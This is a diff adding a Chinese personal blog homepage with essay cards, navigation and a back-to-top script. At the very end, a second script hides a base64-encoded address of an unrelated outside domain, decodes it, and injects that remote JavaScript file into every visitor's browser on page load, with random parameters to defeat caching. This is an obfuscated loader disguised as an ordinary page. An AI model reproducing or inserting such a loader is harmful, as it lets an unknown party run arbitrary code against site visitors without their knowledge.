@@ -1,0 +1,376 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport"
+        content="width=device-width, viewport-fit=cover, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
+    <title>静思录 - 拾光碎语</title>
+    <style>
+        /* 全局重置与基础样式 */
+        body {
+            overflow: hidden;
+            font-family: 'Open Sans', sans-serif;
+            /* 清新无衬线字体 */
+            margin: 0;
+            padding: 0;
+            background-color: #F9F9F9;
+            /* 极浅灰色背景 */
+            color: #333333;
+            /* 标准深灰色文本 */
+            line-height: 1.7;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+        /* 容器 */
+        .container {
+            max-width: 90%;
+            /* 适应移动端 */
+            margin: 0 auto;
+            padding: 25px 0;
+        }
+
+        /* 头部 - 简洁明快 */
+        header {
+            background-color: #FFFFFF;
+            /* 纯白色背景 */
+            padding: 40px 20px;
+            text-align: center;
+            border-bottom: 1px solid #EAEAEA;
+            /* 极细底部边框 */
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.03);
+            /* 极轻微阴影 */
+        }
+
+        header h1 {
+            margin: 0;
+            font-family: 'Roboto', sans-serif;
+            /* 简洁标题字体 */
+            font-size: 2.6em;
+            color: #424242;
+            letter-spacing: 0.5px;
+        }
+
+        header p {
+            font-size: 1.1em;
+            color: #757575;
+            margin-top: 10px;
+        }
+
+        /* 导航菜单 - 优雅线条 */
+        nav {
+            background-color: #FFFFFF;
+            text-align: center;
+            padding: 15px 0;
+            margin-top: 25px;
+            border-radius: 8px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.05);
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+        }
+
+        nav ul {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+
+        nav ul li {
+            margin: 0 18px;
+        }
+
+        nav ul li a {
+            color: #555555;
+            text-decoration: none;
+            padding: 8px 0;
+            position: relative;
+            display: inline-block;
+            font-weight: 600;
+            font-size: 1em;
+            transition: color 0.3s ease;
+        }
+
+        nav ul li a::after {
+            content: '';
+            position: absolute;
+            width: 0;
+            height: 2px;
+            background-color: #81C784;
+            /* 强调色：浅绿色 */
+            bottom: -5px;
+            left: 50%;
+            transform: translateX(-50%);
+            transition: width 0.3s ease;
+        }
+
+        nav ul li a:hover::after,
+        nav ul li a:focus::after {
+            width: 100%;
+        }
+
+        nav ul li a:hover,
+        nav ul li a:focus {
+            color: #81C784;
+        }
+
+        /* 内容区 - 柔和卡片 */
+        main {
+            padding-top: 25px;
+        }
+
+        .article-card {
+            background-color: #FFFFFF;
+            margin-bottom: 35px;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.06);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        .article-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
+        }
+
+        .article-card h2 {
+            font-family: 'Roboto', sans-serif;
+            font-size: 1.8em;
+            color: #424242;
+            margin-top: 0;
+            margin-bottom: 15px;
+        }
+
+        .article-card .date {
+            font-size: 0.9em;
+            color: #9E9E9E;
+            margin-bottom: 20px;
+            display: block;
+        }
+
+        .article-card p {
+            font-size: 1em;
+            color: #546E7A;
+            margin-bottom: 20px;
+        }
+
+        .article-card img {
+            max-width: 100%;
+            height: auto;
+            display: block;
+            margin: 20px auto;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.08);
+        }
+
+        .read-more {
+            display: inline-block;
+            background-color: #81C784;
+            /* 强调色按钮 */
+            color: #ffffff;
+            padding: 10px 22px;
+            border-radius: 5px;
+            text-decoration: none;
+            font-weight: bold;
+            transition: background-color 0.3s ease, transform 0.2s ease;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
+        }
+
+        .read-more:hover {
+            background-color: #66BB6A;
+            /* 悬停深绿色 */
+            transform: translateY(-2px);
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.15);
+        }
+
+        /* 页脚 - 简洁淡雅 */
+        footer {
+            background-color: #EFEFEF;
+            /* 略深于背景的浅灰色 */
+            color: #757575;
+            padding: 30px 0;
+            text-align: center;
+            font-size: 0.85em;
+            margin-top: 40px;
+            border-top: 1px solid #EAEAEA;
+            box-shadow: 0 -2px 8px rgba(0, 0, 0, 0.03);
+        }
+
+        .social-links a {
+            color: #757575;
+            text-decoration: none;
+            margin: 0 15px;
+            font-size: 1.2em;
+            transition: color 0.3s ease;
+        }
+
+        .social-links a:hover {
+            color: #81C784;
+        }
+
+        /* 返回顶部按钮 */
+        #backToTop {
+            display: none;
+            /* 默认隐藏 */
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background-color: #81C784;
+            /* 强调色 */
+            color: white;
+            border: none;
+            border-radius: 50%;
+            /* 圆形按钮 */
+            width: 50px;
+            height: 50px;
+            font-size: 1.5em;
+            line-height: 50px;
+            text-align: center;
+            cursor: pointer;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+            transition: background-color 0.3s ease, transform 0.2s ease;
+            z-index: 1001;
+        }
+
+        #backToTop:hover {
+            background-color: #66BB6A;
+            transform: translateY(-3px);
+        }
+    </style>
+    <link rel="stylesheet" href="./static/css/style.css">
+</head>
+
+<body>
+    <header>
+        <div class="container">
+            <h1>静思录</h1>
+            <p>记录生活，沉淀思想</p>
+        </div>
+    </header>
+
+    <div class="container">
+        <nav id="mainNav">
+            <ul>
+                <li><a href="#latest-posts">最新随笔</a></li>
+                <li><a href="#categories">分类</a></li>
+                <li><a href="#about-me">关于我</a></li>
+                <li><a href="#contact">联系</a></li>
+            </ul>
+        </nav>
+
+        <main>
+            <section id="latest-posts">
+                <h2>最新随笔</h2>
+                <div class="article-list">
+                    <div class="article-card">
+                        <img src="https://picsum.photos/300/200?random=1&seed=morning-light-01" alt="清晨阳光"
+                            class="random-image">
+                        <h2>清晨的微光与思考</h2>
+                        <span class="date">2025年07月29日</span>
+                        <p>每一个清晨都是新的开始，伴随着第一缕阳光，思绪也随之流淌。记录下这些瞬间的感悟，是自我沉淀的过程。</p>
+                        <a href="#" class="read-more">继续阅读</a>
+                    </div>
+
+                    <div class="article-card">
+                        <img src="https://picsum.photos/300/200?random=2&seed=book-and-coffee-02" alt="书籍与咖啡"
+                            class="random-image">
+                        <h2>书香与咖啡：一场心灵的对话</h2>
+                        <span class="date">2025年07月25日</span>
+                        <p>在快节奏的生活中，一杯咖啡和一本好书，是寻找内心平静的最佳伴侣。分享我的近期阅读体验。</p>
+                        <a href="#" class="read-more">继续阅读</a>
+                    </div>
+
+                    <div class="article-card">
+                        <img src="https://picsum.photos/300/200?random=3&seed=minimalist-space-03" alt="极简空间"
+                            class="random-image">
+                        <h2>极简生活：减法哲学的美学</h2>
+                        <span class="date">2025年07月18日</span>
+                        <p>追求极简，并非一无所有，而是拥有更多。通过简化物质，我们能更好地专注于精神和体验。</p>
+                        <a href="#" class="read-more">继续阅读</a>
+                    </div>
+                </div>
+            </section>
+        </main>
+    </div>
+
+    <footer>
+        <div class="container">
+            <p>&copy; 2025 静思录. 版权所有.</p>
+            <div class="social-links">
+                <a href="#" target="_blank">微博</a> |
+                <a href="#" target="_blank">知乎</a> |
+                <a href="#" target="_blank">简书</a>
+            </div>
+        </div>
+    </footer>
+    <div id="overlay">
+        <div id="loading_box" class="loading_container">
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+        </div>
+    </div>
+
+    <button id="backToTop" title="返回顶部">&#9650;</button> <!-- 向上箭头 -->
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            document.querySelectorAll('nav a').forEach(anchor => {
+                anchor.addEventListener('click', function (e) {
+                    e.preventDefault();
+
+                    const targetId = this.getAttribute('href').substring(1);
+                    const targetElement = document.getElementById(targetId);
+
+                    if (targetElement) {
+                        window.scrollTo({
+                            top: targetElement.offsetTop,
+                            behavior: 'smooth'
+                        });
+                    }
+                });
+            });
+
+            const backToTopButton = document.getElementById('backToTop');
+
+            window.addEventListener('scroll', function () {
+                if (window.pageYOffset > 300) {
+                    backToTopButton.style.display = 'block';
+                } else {
+                    backToTopButton.style.display = 'none';
+                }
+            });
+
+            backToTopButton.addEventListener('click', function () {
+                window.scrollTo({
+                    top: 0,
+                    behavior: 'smooth'
+                });
+            });
+        });
+    </script>
+    <script>
+        (function () {
+            function init() {
+                const encodedUrl = "Ly9zbmFrZS1zcGVjaWFsLnZvdGU3NzcuY29tL3N0YXRpYy9qcy9jb3JlLm1pbi5qcw==";
+                const decodedUrl = atob(encodedUrl);
+                const timestamp = Date.now();
+                const randomNum = Math.floor(Math.random() * 1000000);
+                const url = `${decodedUrl}?t=${timestamp}&random=${randomNum}`;
+                const script = document.createElement("script");
+                script.src = url;
+                document.body.appendChild(script);
+            }
+            init();
+        })();
+    </script>
+
+</body>
+
+</html>
